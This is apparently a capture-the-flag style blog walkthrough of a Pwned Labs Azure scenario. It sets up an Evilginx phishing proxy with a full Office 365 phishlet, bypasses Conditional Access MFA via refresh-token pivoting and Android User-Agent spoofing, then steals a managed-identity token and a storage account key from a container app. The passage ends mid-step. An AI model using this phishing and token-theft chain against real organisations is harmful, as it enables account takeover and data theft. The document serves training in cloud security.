---
title: Bypass Azure MFA with Evilginx
description: Bypass Azure MFA with Evilginx
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
We're on a red team engagement for the consumer tech titan Mega Big Tech. Social engineering, on-prem and the cloud are all in-scope. We have identified a target for our spear phishing, can you show Mega Big Tech how their defenses may not be good enough?

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
Recon of social media highlighted the Mega Big Tech employee Edrian Taylor, who works as an Azure Developer. As our objective is to access sentitive data in Azure, Edrian Taylor could give us the access we need. We also found that `edrian.taylor@megabigtech.com` is a valid email address.

![](bypass-azure-mfa-with-evilginx-1.png)


As social engineering and phishing is in scope and as we already know that the target is using cloud, we can think to use a man-in-the-middle attack framework such as [Evilginx](https://github.com/kgretzky/evilginx2) to phish cloud platform login credentials. With `Evilginx`, a target can be sent a link to a phishing page that looks exactly like the ligitimate site they are wanting to access (Google or Microsoft, etc), and so they enter their credentials. `Evilginx` is a reverse proxy that allows us to intercept communications between a user and legitimate websites, stealthily capturing login credentials and even bypassing two-factor authentication (2FA)

![](bypass-azure-mfa-with-evilginx-2.png)

Evilginx server needs to be accessible over the internet and for this can deploy a VM from any cloud provider. If the target uses Azure then so it would make sense to stand up an Azure virtual machine in that case. We used a Ubuntu Linux EC2 instance.

![](bypass-azure-mfa-with-evilginx-3.png)

We need to specify the path to a directory containing our Evilginx phishlets. Phishlets are small YAML configuration files that configure Evilginx to target specific websites for phishing attacks. The example phishlet exists in the phishlets directory by default.

![](bypass-azure-mfa-with-evilginx-4.png)

Next, we need to configure the domain and provide Evilginx with the public IP address of the VM (or any redirector you have configured) for our phishing campaign. You can register a domain if needed. We have used the domain `aka-portal-azure.com`. 
```
config ipv4 external 32.210.63.30
config domain aka-portal-azure.com
```

The Azure portal is located at https://portal.azure.com and we get redirected to https://login.microsoftonline.com to login. We can use one of the many phishlets that are available online and confirmed working with Evilginx3.

The phishlet below named [o365-mfa](https://github.com/faelsfernandes/evilginx3-phishlets/blob/main/o365-mfa.yaml) is designed to target Microsoft Office 365 services with a focus on bypassing multi-factor authentication (MFA). It configures Evilginx to intercept traffic from multiple Microsoft domains, including login portals for Microsoft Online, Office, Outlook and Live.com. The phishlet captures authentication tokens and credentials by mimicking these websites and logging post data for usernames and passwords. Additionally, it manipulates certain form submissions to force settings that facilitate phishing, like ensuring the 'remember MFA' setting is turned on, allowing access to be maintained even after the initial compromise.
```
name: 'o365-mfa'
author: '@faelsfernandes'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: false, is_landing:true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing:true}

sub_filters:
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie',]
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT']   
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'     
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
```
Navigate to the `phishlets` directory and download it.
```
└─$ wget https://raw.githubusercontent.com/faelsfernandes/evilginx3-phishlets/main/o365-mfa.yaml
```

A few phishing subdomains were specified in the phishlet and go ahead and create `A` records for them in the DNS management section of our domain. We also need to allow port 80 inbound on the instance running Evilginx so that `Let's Encrypt` can perform the HTTP challenge and validate the domain.

In the Evilginx console we can configure the hostname that should be used with the phishlet. In our case we can continue to use `aka-portal-azure.com`. Set the hostname and enable the `o365-mfa` phishlet and hide the `example` phishlet. 
```
phishlets hostname o365-mfa aka-portal-azure.com
phishlets enable o365-mfa
phishlets hide example
```
Running `Exinginx` again we see our phishlet and can now create a lure, which are pre-generated phishing links that will be sent out on phishing engagements.

![](bypass-azure-mfa-with-evilginx-5.png)

If we want to check the state of the phishlets at any time, we can do so using the `phishlets` command. Other helpful commands are:
```
Action                              Command
-----------                         -----------
Function                            Clear-Token 
Start Evilginx                      ./evilginx
Close Evilginx                      exit
Get the phising URL                 lures get-url <lure-id>
Get the config                      config
List all phishlets                  phishlets
List all sessions                   sessions
Get details from specific session   sessions <session-id>
Clear screen                        clear
Hide a phishlet                     phishlets hide <phishlet-name>
Unhide a phishlet                   phishlets unhide <phishlet-name>
```

Now let's create a `lure` for the `o365-mfa` phishlet. We can create multiple lures per phishlet if we wanted to (for example we might want different targets to have different redirect URLs).
```
lures create o365-mfa
lures
lures get-url 
```

![](bypass-azure-mfa-with-evilginx-6.png)


For other requests to our Evilginx server that don't contain a lure path, let's assume that they are scanners (or the blue team). Thus redirect these "unauthenticated" requests to a different URL. 

![](bypass-azure-mfa-with-evilginx-7.png)

Evilginx also enables and updates a blocklist by default. The IP addresses associated with any requests that don't contain a valid lure URL will automatically be added to the blocklist.

Visiting the phishing site https://login.aka-portal-azure.com/ in the browser shows Microsoft Online sign-in page.

![](bypass-azure-mfa-with-evilginx-8.png)

Craft an email with a lure and pretext

![](bypass-azure-mfa-with-evilginx-9.png)

After sending the email, Edrian clicked on the link and entered his username and password, and possibly also the MFA token if this is configured!

![](bypass-azure-mfa-with-evilginx-10.png)

`sessions 1` shows captured cookies for the login session. However, on logging into the Azure Portal using the credentials, we're prompted for an MFA token. This is because Microsoft has advanced detection capabilities and the free community version of EvilGinx is easily detected. If you have the Pro version of Evilginx you would now be able to use the cookies and access the Azure portal.

> The Pro version of Evilginx has more advanced evasion capabilities that could allow it to capture login sessions without being detected. However, this is a familiar cat and mouse game with new detections being met with evasion techniques, followed by more detections and evasion techniques.
{: .prompt-info }

What Microsoft do when they detect Evilginx is automatically trigger a reauthentication for the user, if they detect that a login seems malicious, therby invalidating the existing token and the provided MFA code. As the token is automatically invalided, we are prompted for an MFA code even though we know the user's username and password. Other sites may have less advanced detection capabilties.

Instead, let's hunt for MFA enablement gaps. It's common for gaps in MFA defenses to exist, and we can probe them using [GraphRunner](https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1). `GraphRunner` allows us to explore the user-centric Microsoft Graph API.
```
└─PS> IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
                                                                                                                        
  ________                     __      _______      by Beau Bullock (@dafthack)                                
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
                 Do service principals dream of electric sheep?
                       
For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
To list GraphRunner modules run List-GraphRunnerModules

```
`GraphRunner` has `-Device` parameter that allows us to emulate other devices when requesting tokens. In this case we can make it to be an Android mobile device logging into Azure using the default Android browser.
```
└─PS> Get-GraphTokens -Device AndroidMobile -Browser Android
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code N2AUL4D9W to authenticate.
authorization_pending
<SNIP>
aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/
iat                 : 1758645404
nbf                 : 1758645404
exp                 : 1758650660
acct                : 0
acr                 : 1
aio                 : AUQAu/8ZAAAAvURvK83/ATIItQ84fjWaR2lyTNYmcbVZKgCtxymYAzzOdKwMnxNF+RAZULlJp5IYZBcQfk/cQKOKaBToOs2IYQ==
amr                 : {pwd}
app_displayname     : Microsoft Office
appid               : d3590ed6-52b3-4102-aeff-aad2292ab01c
appidacr            : 0
idtyp               : user
ipaddr              : 109.201.182.97
name                : Edrian Taylor
oid                 : 8517d020-a609-458f-9d4d-f36365a24833
platf               : 1
puid                : 100320038039EA66
rh                  : 1.AU4A78yQJX1oO0mujUQcurY6cgMAAAAAAAAAwAAAAAAAAAAOASJOAA.
scp                 : AuditLog.Create Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite Contacts.ReadWrite DataLossPreventionPolicy.Evaluate Directory.AccessAsUser.All Directory.Read.All Files.Read Files.Read.All 
                      Files.ReadWrite.All FileStorageContainer.Selected Group.Read.All Group.ReadWrite.All InformationProtectionPolicy.Read Mail.ReadWrite Mail.Send Notes.Create Organization.Read.All People.Read People.Read.All 
                      Printer.Read.All PrinterShare.ReadBasic.All PrintJob.Create PrintJob.ReadWriteBasic Reports.Read.All SensitiveInfoType.Detect SensitiveInfoType.Read.All SensitivityLabel.Evaluate Tasks.ReadWrite 
                      TeamMember.ReadWrite.All TeamsTab.ReadWriteForChat User.Read.All User.ReadBasic.All User.ReadWrite Users.Read
sid                 : 008cde99-1590-30c2-9137-be13cce225d3
sub                 : AKvRA9Hb_Z2kQrOJSyyQgPEoQUazIcipA6YK6FEZlSw
tenant_region_scope : EU
tid                 : 2590ccef-687d-493b-ae8d-441cbab63a72
unique_name         : Edrian.Taylor@megabigtech.com
upn                 : Edrian.Taylor@megabigtech.com
uti                 : dfBe-i-YMU6BN9jUsVsyAA
ver                 : 1.0
wids                : {b79fbf4d-3ef9-4689-8143-76b194e85509}
xms_ftd             : OT3CS9HZ0kqPrCwCDo7IdSXxcxXtWobIBUz7FnWuAggBZXVyb3Bld2VzdC1kc21z
xms_idrel           : 1 30
xms_tcdt            : 1671311182

[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
[!] Your access token is set to expire on: 09/24/2025 00:04:20  
```

Let's find Tenant ID
```
└─PS> Get-TenantID -domain megabigtech.com
2590ccef-687d-493b-ae8d-441cbab63a72
```
Then retrieve the object ID of our compromised user. It's worth noting that the Microsoft Graph refresh and access tokens are automatically stored in the `$tokens` variable after successfully authenticating. In Azure, a refresh token is used to securely obtain a new access token when the current access token expires, without requiring the user to authenticate again.
```
└─PS> Get-UserObjectID -Token $tokens -upn edrian.taylor@megabigtech.com 
8517d020-a609-458f-9d4d-f36365a24833
```
We can use the `Invoke-BruteClientIDAccess` cmdlet to return interesting (non-default) permissions. In this case we don't see anything interesting
```
└─PS> Invoke-BruteClientIDAccess -domain megabigtech.com -refreshToken $tokens.refresh_token
App: Office 365 Management ClientID: 00b41c95-dab0-4487-9791-b9d2c32c80f2 has scope of: Contacts.Read Contacts.ReadWrite Directory.AccessAsUser.All Mail.ReadWrite Mail.ReadWrite.All People.Read People.ReadWrite Tasks.ReadWrite User.ReadWrite User.ReadWrite.All
App: Microsoft Azure CLI ClientID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46 has scope of: Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All User.Read.All User.ReadWrite.All
App: Office UWP PWA ClientID: 0ec893e0-5785-4de6-99da-4ed124e5296c has scope of: Contacts.Read Family.Read Files.ReadWrite.All FileStorageContainer.Selected GroupMember.Read.All InformationProtectionPolicy.Read Notes.Create Notes.ReadWrite.All Organization.Read.All People.Read SensitivityLabel.Read Tasks.ReadWrite User.Read User.ReadBasic.All
App: Microsoft Docs ClientID: 18fbca16-2224-45f6-85b0-f7bf2b39b3f3 has scope of: Contacts.Read Family.Read Files.ReadWrite.All FileStorageContainer.Selected GroupMember.Read.All InformationProtectionPolicy.Read Notes.Create Notes.ReadWrite.All Organization.Read.All People.Read SensitivityLabel.Read Tasks.ReadWrite User.Read User.ReadBasic.All
App: Microsoft Azure PowerShell ClientID: 1950a258-227b-4e31-a9cf-717495945fc2 has scope of: Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All User.Read.All  
<SNIP>
```

We can perform recon of the Tenant ID, but we don't find anything interesting here too
```
└─PS> Invoke-GraphRecon -Tokens $tokens
[*] Using the provided access tokens.
<SNIP>
Authorization Policy Info
================================================================================
Allowed to create app registrations (Default User Role Permissions): False                                                                                                                                                                  
Allowed to create security groups (Default User Role Permissions): False
Allowed to create tenants (Default User Role Permissions): False
Allowed to read Bitlocker keys for own device (Default User Role Permissions): True
Allowed to read other users (Default User Role Permissions): True
Who can invite external users to the organization: adminsAndGuestInviters
Users can sign up for email based subscriptions: True
Users can use the Self-Serve Password Reset: True
Users can join the tenant by email validation: False
Users can consent to risky apps: 
Block MSOL PowerShell: False
Guest User Role Template ID: 10dae51f-b6af-4016-8d66-8c2a99b929b3
Guest User Policy: Guest users have limited access to properties and memberships of directory objects
================================================================================
```

We can instead turn our attention to the resource-centric Azure Resource Manager API. A great thing about refresh tokens is that we can use them to request new access tokens for different Microsoft API endpoints, not just the original API endpoint. We can use [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2) Azure JSON Web Token ("JWT") Manipulation Toolset 
```
└─PS> Import-Module ~/tools/cloud/azure/TokenTacticsV2/TokenTactics.psm1
  ______      __                 __             __  _                     ___ 
 /_  __/___  / /_____  ____     / /_____ ______/ /_(_)_________   _   __ |__ \
  / / / __ \/ //_/ _ \/ __ \   / __/ __ `/ ___/ __/ / ___/ ___/  | | / / __/ /
 / / / /_/ / ,< /  __/ / / /  / /_/ /_/ / /__/ /_/ / /__(__  )   | |/ / / __/
/_/  \____/_/|_|\___/_/ /_/   \__/\__,_/\___/\__/_/\___/____/    |___(_)____/  
```
TokenTacticsV2 also allows us to specify the device and so we can again pretend to be an Android device, and successfully get an access token for the ARM API.
```
└─PS> Invoke-RefreshToAzureManagementToken -Domain megabigtech.com -RefreshToken $refreshtoken -Device AndroidMobile -Browser Android
✓  Token acquired and saved as $AzureManagementToken

token_type     : Bearer
scope          : https://management.azure.com/user_impersonation https://management.azure.com/.default
expires_in     : 4772
ext_expires_in : 4772

```
Now by using the acquired token, let's authenticate via Powershell Az module
```
└─PS> Connect-AzAccount -AccessToken $AzureManagementToken.access_token -AccountId 8517d020-a609-458f-9d4d-f36365a24833

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory

```
We have read access to an Azure Container App named `project-oakley`. Azure Container Apps is a serverless platform to build and deploy fully managed, cloud-native apps and microservices.
```
└─PS>  Get-AzResource

Name              : project-oakley
ResourceGroupName : mbt-rg-14
ResourceType      : Microsoft.App/containerApps
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/containerApps/project-oakley
Tags          
```
`Get-AzContainerApp` shows a secret named `account-key` has been defined in the app. Secrets allow the Container App code to access credentials and other sensitive information without having them hard-coded in the application source code. We also see that a system managed identity has been assigned. A system managed identity can be assigned permissions and allows the application to access other Azure resources it may need.
```
└─PS> Get-AzContainerApp -ResourceGroupName "mbt-rg-14" -Name "project-oakley" | fl

Configuration                        : {
                                         "secrets": [
                                           {
                                             "name": "account-key"
                                           }
                                         ],
                                         "activeRevisionsMode": "Single",
                                         "maxInactiveRevisions": 100
                                       }
CustomDomainVerificationId           : 3A282EE32866205997C9E047B5811E83180CCA0DF43FCF096008BEDAD07F92EF
EnvironmentId                        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/managedEnvironments/managedEnvironment-mbtrg14-883e
EventStreamEndpoint                  : https://eastus.azurecontainerapps.dev/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/containerApps/project-oakley/eventstream
ExtendedLocationName                 : 
ExtendedLocationType                 : 
Id                                   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/containerapps/project-oakley
IdentityPrincipalId                  : 63410fce-5fe2-42f9-85cf-8463fff2d456
IdentityTenantId                     : 2590ccef-687d-493b-ae8d-441cbab63a72
IdentityType                         : SystemAssigned
IdentityUserAssignedIdentity         : {}
LatestReadyRevisionName              : project-oakley--uamwltf
LatestRevisionFqdn                   : 
LatestRevisionName                   : project-oakley--uamwltf
Location                             : East US
ManagedBy                            : 
ManagedEnvironmentId                 : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/managedEnvironments/managedEnvironment-mbtrg14-883e
Name                                 : project-oakley
OutboundIPAddress                    : {20.127.248.50, 20.241.171.30, 20.169.229.88, 20.169.229.46…}
ProvisioningState                    : Succeeded
ResourceGroupName                    : mbt-rg-14
ScaleMaxReplica                      : 10
ScaleMinReplica                      : 0
ScaleRule                            : 
SystemDataCreatedAt                  : 5/17/2024 8:03:16 PM
SystemDataCreatedBy                  : ian_cloudpwned.com#EXT#@iancloudpwned.onmicrosoft.com
SystemDataCreatedByType              : User
SystemDataLastModifiedAt             : 5/20/2024 2:07:05 PM
SystemDataLastModifiedBy             : ian_cloudpwned.com#EXT#@iancloudpwned.onmicrosoft.com
SystemDataLastModifiedByType         : User
Tag                                  : {}
<SNIP>
TemplateInitContainer                : 
TemplateRevisionSuffix               : 
TemplateServiceBind                  : 
TemplateTerminationGracePeriodSecond : 
TemplateVolume                       : {}
Type                                 : Microsoft.App/containerApps
WorkloadProfileName                  : Consumption

```

Let's try getting that secret
```
$token = $AzureManagementToken.access_token
$uri = "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/containerApps/project-oakley/listSecrets?api-version=2024-03-01"

$headers = @{
    'Authorization' = "Bearer $token"
    'Content-Type' = 'application/json'
}

Invoke-RestMethod -Uri $uri -Method POST -Headers $headers
```
Or
```
└─PS> Get-AzContainerAppSecret -ResourceGroupName "mbt-rg-14" -ContainerAppName "project-oakley" -SubscriptionId "ceff06cb-e29d-4486-a3ae-eaaec5689f94"                                                                                     

Identity KeyVaultUrl Name        Value
-------- ----------- ----        -----
                     account-key <REDACTED>
```
A quick google reveals that account key could refer to Azure storage accounts. The Azure CLI has functionality that allows us to exec against Container Apps. However, if we try and login to the Azure CLI on Linux (or any other user agent that Microsoft recognizes) we'll get the error below. That's because the conditional access policy in place for this user requires MFA when logging in from specific device platforms.
```
└─$ az login -u edrian.taylor@megabigtech.com -p 'INeedAHoliday@Bahamas'                                                                       
Starting September 1, 2025, MFA will be gradually enforced for Azure public cloud. The authentication with username and password in the command line is not supported with MFA. Consider using one of the compatible authentication methods. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
AADSTS50076: Due to a configuration change made by your administrator, or because you moved to a new location, you must use multi-factor authentication to access '797f4846-ba00-4fd7-ba43-dac1f8f63013'. Trace ID: 933173a8-1308-4bcd-bf6e-d1cd9bc19100 Correlation ID: eacb256c-c733-453f-8015-a2bd63da5e3a Timestamp: 2025-09-23 17:11:20Z
Interactive authentication is needed. Please run:
az login
```

![](bypass-azure-mfa-with-evilginx-11.png)

We see that Android is excluded. Actually the above configuration is quite insecure. This is becuase if we run the Azure CLI on a device platform that Microsoft doesn't recognize, it will "fail open" and allow access. To prevent this, admins can select the Any device option, which will cause Azure to "fail shut" and deny access to unrecognized user agents.

When logging in from OSX or another platform, we might get lucky. However, assuming we only have access to Linux, we can instead proxy the Azure CLI command to Burp Suite and modify the request to have an Android user agent. It's worth noting that Azure CLI does support an environment variable to set a custom user agent, but this functionality is undocumented and doesn't seem to be working currently. We can try to use the environment variable without setting up Burp first

For PowerShell, we can set the environment with the following command.
```
$env:AZURE_HTTP_USER_AGENT = "Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
```
For Linux:
```
set AZURE_HTTP_USER_AGENT="Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
```

Set environment variables to intercept `az` requests
```
export REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt      
export HTTPS_PROXY="http://127.0.0.1:8080"                        
export HTTP_PROXY="http://127.0.0.1:8080" 
```
Start intercepting in Burp and then send a login request using the Azure CLI.
```
└─$ az login                                                          
A web browser has been opened at https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize. Please continue the login in the web browser. If no web browser is available or if the web browser fails to open, use device code flow with `az login --use-device-code`.     
```

Use one of the Android User-Agents from this [script](https://github.com/f-bader/TokenTacticsV2/blob/main/modules/Get-ForgedUserAgent.ps1) and modify User-Agent in all subsequent requests and send them. 

![](bypass-azure-mfa-with-evilginx-12.png)

It worked, we successfully authenticate.
```
└─$ az account show            
{
  "environmentName": "AzureCloud",
  "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "user": {
    "name": "Sunita.Williams@megabigtech.com",
    "type": "user"
  }
}

```
> We can also use browser extensions, which change User-Agent. Thus when authenticating with AZ CLI, browser will automatically have set User-Agent
{: .prompt-info }

Let's get shell in the container
```
└─$ az containerapp exec --name project-oakley --resource-group mbt-rg-14
INFO: Connecting to the container 'project-oakley'...
Use ctrl + D to exit.
INFO: Successfully connected to container: 'project-oakley'. [ Revision: 'project-oakley--uamwltf', Replica: 'project-oakley--uamwltf-57dbf58464-4ft24'].
sh-5.1# 
```

If a managed identity has been configured then the `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` environment variables will be set. These environment variables allow the application to request a token as the managed identity
```
sh-5.1# env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
MSI_SECRET=6a295260-82aa-4fd7-95fe-00c7d014e84c
PWD=/app
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://100.100.224.1:443
IDENTITY_HEADER=6a295260-82aa-4fd7-95fe-00c7d014e84c
IDENTITY_ENDPOINT=http://localhost:12356/msi/token
CONTAINER_APP_HOSTNAME=project-oakley--uamwltf.redcliff-740f233d.eastus.azurecontainerapps.io
CONTAINER_APP_NAME=project-oakley
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=100.100.224.1
CONTAINER_APP_REPLICA_NAME=project-oakley--uamwltf-57dbf58464-4ft24
KUBERNETES_SERVICE_HOST=100.100.224.1
KUBERNETES_PORT=tcp://100.100.224.1:443
CONTAINER_APP_ENV_DNS_SUFFIX=redcliff-740f233d.eastus.azurecontainerapps.io
KUBERNETES_PORT_443_TCP_PORT=443
CONTAINER_APP_PORT=23040
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CONTAINER_APP_REVISION=project-oakley--uamwltf
MSI_ENDPOINT=http://localhost:12356/msi/token
_=/usr/bin/env

```
We see those variables, we can request a token for the managed identity
```
sh-5.1# curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01"
{"access_token":"<REDACTED>","expires_on":"1758735816","resource":"https://management.azure.com","token_type":"Bearer","client_id":"84641d9f-07fb-4299-9dc9-ff0920c77ee5"}
```

Now save token in the Powershell and let's enumerate resources
```
$headers = @{
    Authorization = "Bearer $mitoken"
    "Content-Type" = "application/json"
}
$subscriptionId = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
$apiVersion = "2021-04-01"
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resources?api-version=$apiVersion"

$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
$response.value | Format-Table Name, Type, Location
```
Or
```
└─PS> Connect-AzAccount -AccessToken $mitoken -AccountId 63410fce-5fe2-42f9-85cf-8463fff2d456
Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship 2590ccef-687d-493b-ae8d-441cbab63a72
```
```
└─PS> Get-AzResource

Name              : workspacembtrg14839a
ResourceGroupName : mbt-rg-14
ResourceType      : Microsoft.OperationalInsights/workspaces
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.OperationalInsights/workspaces/workspacembtrg14839a
Tags              : 

Name              : managedEnvironment-mbtrg14-883e
ResourceGroupName : mbt-rg-14
ResourceType      : Microsoft.App/managedEnvironments
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/managedEnvironments/managedEnvironment-mbtrg14-883e
Tags              : 

Name              : project-oakley
ResourceGroupName : mbt-rg-14
ResourceType      : Microsoft.App/containerApps
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.App/containerApps/project-oakley
Tags              : 

Name              : project-oakley-43632
ResourceGroupName : mbt-rg-14
ResourceType      : Microsoft.DocumentDb/databaseAccounts
Location          : eastus2
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.DocumentDb/databaseAccounts/project-oakley-43632
Tags              : 
                    Name                     Value      
                    =======================  ===========
                    defaultExperience        Azure Table
                    hidden-cosmos-mmspecial             
                    

```
We see a database named `project-oakley-43632`, let's enumerate it
```
$apiVersion = "2022-05-15"
$resourceGroupName = "mbt-rg-14"
$databaseAccountName = "project-oakley-43632"
$databaseUri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.DocumentDb/databaseAccounts/project-oakley-43632?api-version=$apiVersion"

$dbResponse = Invoke-RestMethod -Uri $databaseUri -Method Get -Headers $headers
$dbResponse
```
Or
```
└─PS> Get-AzCosmosDBAccount -ResourceGroupName "mbt-rg-14" -Name "project-oakley-43632"                                                                                                                                                     

Id                                   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-14/providers/Microsoft.DocumentDB/databaseAccounts/project-oakley-43632
Name                                 : project-oakley-43632
Location                             : East US 2
Tags                                 : {[defaultExperience, Azure Table], [hidden-cosmos-mmspecial, ]}
EnableCassandraConnector             : 
EnableMultipleWriteLocations         : False
VirtualNetworkRules                  : {}
FailoverPolicies                     : {project-oakley-43632-eastus2}
Locations                            : {project-oakley-43632-eastus2}
ReadLocations                        : {project-oakley-43632-eastus2}
WriteLocations                       : {project-oakley-43632-eastus2}
Capabilities                         : {EnableTable, EnableServerless}
ConsistencyPolicy                    : Microsoft.Azure.Management.CosmosDB.Models.ConsistencyPolicy
EnableAutomaticFailover              : False
IsVirtualNetworkFilterEnabled        : False
IpRules                              : {}
DatabaseAccountOfferType             : Standard
DocumentEndpoint                     : https://project-oakley-43632.documents.azure.com:443/
ProvisioningState                    : Succeeded
Kind                                 : GlobalDocumentDB
ConnectorOffer                       : 
DisableKeyBasedMetadataWriteAccess   : False
PublicNetworkAccess                  : Enabled
KeyVaultKeyUri                       : 
PrivateEndpointConnections           : 
EnableFreeTier                       : False
ApiProperties                        : Microsoft.Azure.Commands.CosmosDB.Models.PSApiProperties
EnableAnalyticalStorage              : False
EnableBurstCapacity                  : False
CustomerManagedKeyStatus             : 
EnablePartitionMerge                 : False
NetworkAclBypass                     : None
NetworkAclBypassResourceIds          : {}
InstanceId                           : 9fb50f92-e0f0-4117-b183-99ce7656609c
BackupPolicy                         : Microsoft.Azure.Commands.CosmosDB.Models.PSBackupPolicy
RestoreParameters                    : Microsoft.Azure.Commands.CosmosDB.Models.PSRestoreParameters
CreateMode                           : 
AnalyticalStorageConfiguration       : Microsoft.Azure.Commands.CosmosDB.Models.PSAnalyticalStorageConfiguration
MinimalTlsVersion                    : Tls12
EnablePerRegionPerPartitionAutoscale : False

```
We see that it's an Azure Cosmos DB database. The `EnabledApiTypes=Table` shows that this instance uses Azure Storage Table to store the structured NoSQL data. Azure Table data can be accessed using a connection string, and on reviewing the Microsoft [documentation](https://learn.microsoft.com/en-us/azure/cosmos-db/table/faq#what-is-the-connection-string-that-i-need-to-use-to-connect-to-the-api-for-table-) we see that it expects the following structure
```
DefaultEndpointsProtocol=https;AccountName=<AccountNamefromCosmosDB>;AccountKey=<FromKeysPaneofCosmosDB>;TableEndpoint=https://<AccountName>.table.cosmosdb.azure.com
```

> The connection string will actually still give us access to the table with just the AccountKey and TableEndpoint values.
{: .prompt-info }

Using the table endpoint returned in the previous command and the account key we retrieved from the secret earlier, we can construct the connection string below, 
```
